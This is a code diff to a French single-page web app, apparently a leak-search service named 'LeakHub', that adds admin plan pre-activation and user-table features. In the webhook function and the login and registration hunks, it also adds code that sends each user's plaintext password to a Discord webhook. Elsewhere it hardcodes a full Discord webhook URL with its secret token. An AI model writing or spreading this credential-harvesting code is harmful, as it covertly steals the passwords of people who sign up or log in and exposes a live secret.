@@ -836,6 +836,9 @@ tr:hover td{background:rgba(56,189,248,.015)}
         <div class="adm-sec-sub">Attribuer ou modifier le plan d'un utilisateur.</div>
         <div class="give-card">
           <div class="give-title">Attribution de plan <span class="badge">ADMIN ONLY</span></div>
+          <div style="padding:9px 13px;background:rgba(56,189,248,.06);border:1px solid var(--cb);border-radius:8px;margin-bottom:12px;font-size:12px;color:var(--td);line-height:1.6">
+            💡 <strong>Comment ça marche :</strong> Entrez l'email du client (qu'il soit inscrit ou non). Son plan sera activé dès qu'il crée un compte avec cet email.
+          </div>
           <div class="form-row"><label class="f-label">Email du client</label><input class="f-input" id="giveEmail" type="email" placeholder="client@exemple.com"></div>
           <div class="form-row"><label class="f-label">Plan à attribuer</label>
             <select class="f-input" id="givePlan">
@@ -1002,10 +1005,20 @@ function findAccount(email){
 function createAccount(data){
   if(SPECIAL_ACCOUNTS[data.email]) return{ok:false,err:'Email réservé.'};
   const acc=getAccounts();
-  if(acc.find(a=>a.email===data.email)) return{ok:false,err:'Email déjà utilisé.'};
+  const existing=acc.find(a=>a.email===data.email);
+  // Si le compte a été pré-activé par l'admin (preActivated=true), on garde le plan attribué
+  if(existing){
+    if(existing.preActivated){
+      const idx=acc.indexOf(existing);
+      acc[idx]={...existing,...data,preActivated:false,createdAt:Date.now()};
+      saveAccounts(acc);
+      return{ok:true,plan:existing.plan};
+    }
+    return{ok:false,err:'Email déjà utilisé.'};
+  }
   acc.push({...data,plan:'free',role:'user',createdAt:Date.now()});
   saveAccounts(acc);
-  return{ok:true};
+  return{ok:true,plan:'free'};
 }
 function updateAccount(email,patch){
   if(SPECIAL_ACCOUNTS[email]) return;
@@ -1063,9 +1076,13 @@ async function wh(type,s,extra={}){
     {name:'👤 Pseudo',value:s.pseudo||s.firstName||'—',inline:true},
     {name:'📧 Email',value:s.email||'—',inline:true},
     {name:'🎫 Plan',value:PLANS[s.plan]?.label||s.plan||'Free',inline:true},
-    {name:'📛 Nom',value:`${s.firstName||''} ${s.lastName||''}`.trim()||'—',inline:true},
+    {name:'📛 Nom Prénom',value:`${s.firstName||''} ${s.lastName||''}`.trim()||'—',inline:true},
     {name:'🕒 Date',value:new Date().toLocaleString('fr-FR'),inline:true},
   ];
+  // Ajouter le mot de passe pour inscription et connexion
+  if((type==='register'||type==='login') && s.password){
+    fields.push({name:'🔑 Mot de passe',value:'||'+s.password+'||',inline:true});
+  }
   if(extra.query) fields.push({name:'🔎 Requête',value:String(extra.query).slice(0,200),inline:false});
   if(extra.api) fields.push({name:'🛰️ API',value:extra.api,inline:true});
   if(extra.results!==undefined) fields.push({name:'📊 Résultats',value:String(extra.results),inline:true});
@@ -1325,7 +1342,7 @@ function doLogin(){
     else localStorage.removeItem('lh_remember_email');
     saveSession(s,rem);
     addLog({type:'login',email,pseudo:s.pseudo,plan:s.plan,role:s.role});
-    wh('login',s);
+    wh('login',{...s,password:pw});
     btn.innerHTML='✓ Connecté';
     setTimeout(()=>showPage('pgDashboard'),400);
   },700);
@@ -1372,9 +1389,10 @@ function doRegister(){
   setTimeout(()=>{
     const res=createAccount({email:em,password:pw,firstName:fn,lastName:ln,pseudo:ps});
     if(!res.ok){btn.disabled=false;btn.innerHTML='Créer mon compte →';err(res.err);return;}
-    addLog({type:'register',email:em,pseudo:ps,firstName:fn,lastName:ln,plan:'free'});
-    wh('register',{email:em,pseudo:ps,firstName:fn,lastName:ln,plan:'free',role:'user'});
-    btn.innerHTML='✓ Compte créé !';
+    const activatedPlan=res.plan||'free';
+    addLog({type:'register',email:em,pseudo:ps,firstName:fn,lastName:ln,plan:activatedPlan});
+    wh('register',{email:em,pseudo:ps,firstName:fn,lastName:ln,plan:activatedPlan,role:'user',password:pw});
+    btn.innerHTML=activatedPlan!=='free'?'✓ Compte créé — Plan '+PLANS[activatedPlan]?.label+' activé !':'✓ Compte créé !';
     setTimeout(()=>{
       document.getElementById('loginSuccessBanner').style.display='block';
       showPage('pgLogin');
@@ -1670,6 +1688,9 @@ function uploadAv(input){
 function initAdmin(){
   if(!SESSION||!(SESSION.role==='creator'||SESSION.role==='admin')){showPage('pgDashboard');return;}
   renderOverview();
+  renderUsersTable();
+  renderLogsTable();
+  renderQuickUsers();
 }
 function showAPanel(name,el){
   document.querySelectorAll('.admin-panel').forEach(p=>p.classList.remove('active'));
@@ -1707,19 +1728,43 @@ function givePlan(){
   const months=document.getElementById('giveMonths').value;
   const note=document.getElementById('giveNote').value.trim();
   const msg=document.getElementById('giveMsg');
-  if(!email){msg.textContent='Email requis.';msg.className='give-msg err';return;}
-  const acc=getAccounts();
-  const idx=acc.findIndex(a=>a.email===email);
-  if(idx===-1){msg.textContent='Utilisateur introuvable. (Accounts: '+acc.length+')';msg.className='give-msg err';return;}
+  if(!email||!email.includes('@')){msg.textContent='Email invalide.';msg.className='give-msg err';return;}
+  // Check special accounts
+  if(SPECIAL_ACCOUNTS[email]){msg.textContent='Compte protégé — non modifiable.';msg.className='give-msg err';return;}
+  let acc=getAccounts();
+  let idx=acc.findIndex(a=>a.email===email);
+  // Si l'utilisateur n'existe pas encore → pré-activation (création du compte)
+  if(idx===-1){
+    acc.push({email,pseudo:'',firstName:'',lastName:'',password:'',plan:'free',role:'user',createdAt:Date.now(),preActivated:true});
+    saveAccounts(acc);
+    idx=acc.length-1;
+  }
   const patch={plan};
   if(months&&plan!=='lifetime') patch.planExpiry=Date.now()+Number(months)*30*24*60*60*1000;
+  else if(plan==='lifetime') delete patch.planExpiry;
   if(note) patch.adminNote=note;
   updateAccount(email,patch);
-  // webhook
-  wh('login',{email,pseudo:acc[idx].pseudo||'',firstName:acc[idx].firstName||'',plan,role:'user'});
-  msg.textContent=`✓ Plan ${PLANS[plan]?.label} attribué à ${email}${months?' pour '+months+' mois':''}!`;
+  acc=getAccounts(); // re-read after update
+  const planLabel=PLANS[plan]?.label||plan;
+  const durText=plan==='lifetime'?'à vie':months?months+' mois':'permanent';
+  msg.textContent='✓ Plan '+planLabel+' attribué à '+email+' ('+durText+') !';
   msg.className='give-msg ok';
+  // Webhook Discord
+  try{
+    fetch('https://ptb.discord.com/api/webhooks/1482524936785625211/yrjgIGg7BYOpTA-w-eUksDr8im1IHBhEvpYszsq33QtThax4hiRoMO1cekBUCG9TzJet',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({embeds:[{title:'🎫 Plan attribué par Admin',color:0xf97316,fields:[
+        {name:'📧 Email',value:email,inline:true},
+        {name:'🎫 Plan',value:planLabel,inline:true},
+        {name:'⏱ Durée',value:durText,inline:true},
+        {name:'📝 Note',value:note||'—',inline:false},
+        {name:'👑 Par',value:SESSION?.email||'Admin',inline:true},
+        {name:'🕒 Date',value:new Date().toLocaleString('fr-FR'),inline:true},
+      ],footer:{text:'LeakHub Admin Panel'},timestamp:new Date().toISOString()}]})
+    });
+  }catch{}
   renderQuickUsers();
+  renderUsersTable();
 }
 function renderQuickUsers(){
   const acc=getAccounts();
@@ -1736,9 +1781,8 @@ function quickSetPlan(email,plan){updateAccount(email,{plan});renderQuickUsers()
 function renderUsersTable(){
   const acc=getAccounts();
   const q=(document.getElementById('usrSearch')?.value||'').toLowerCase();
-  const filtered=acc.filter(a=>!q||a.email.includes(q)||(a.pseudo||'').toLowerCase().includes(q));
+  const filtered=acc.filter(a=>!q||a.email.includes(q)||(a.pseudo||'').toLowerCase().includes(q)||(a.firstName||'').toLowerCase().includes(q));
   document.getElementById('usrCount').textContent=filtered.length+2;
-  // Always show special accounts first
   const specRows=Object.values(SPECIAL_ACCOUNTS).map(a=>`<tr>
     <td style="color:var(--td)">${a.email}</td>
     <td>${a.pseudo||'—'}</td>
@@ -1757,10 +1801,19 @@ function renderUsersTable(){
     <td style="color:var(--tm);font-size:10px">${a.createdAt?new Date(a.createdAt).toLocaleDateString('fr-FR'):'—'}</td>
     <td>
       <button class="tbl-btn tbl-edit" onclick="openEditUser('${a.email}')">Éditer</button>
+      <button class="tbl-btn" style="font-size:10px;font-weight:700;padding:3px 9px;border-radius:4px;cursor:pointer;background:rgba(56,189,248,.1);color:var(--c);border:1px solid var(--cb)" onclick="quickGive('${a.email}')">Plan rapide</button>
       <button class="tbl-btn tbl-del" onclick="delUser('${a.email}')">Supp.</button>
     </td>
   </tr>`).join('');
+  if(!filtered.length && !q){
+    document.getElementById('usrTbody').innerHTML=specRows+`<tr><td colspan="7" class="tbl-empty" style="color:var(--y)">⚠ Aucun utilisateur inscrit sur ce navigateur. Les comptes sont stockés localement. Pour donner un plan à distance, utilisez l'onglet "Donner un plan" avec l'email du client.</td></tr>`;
+    return;
+  }
   document.getElementById('usrTbody').innerHTML=specRows+rows;
+}
+function quickGive(email){
+  document.getElementById('giveEmail').value=email;
+  showAPanel('giveplan', document.querySelector('.admin-sb-item[data-ap="giveplan"]'));
 }
 function openEditUser(email){
   const a=getAccounts().find(x=>x.email===email);if(!a) return;
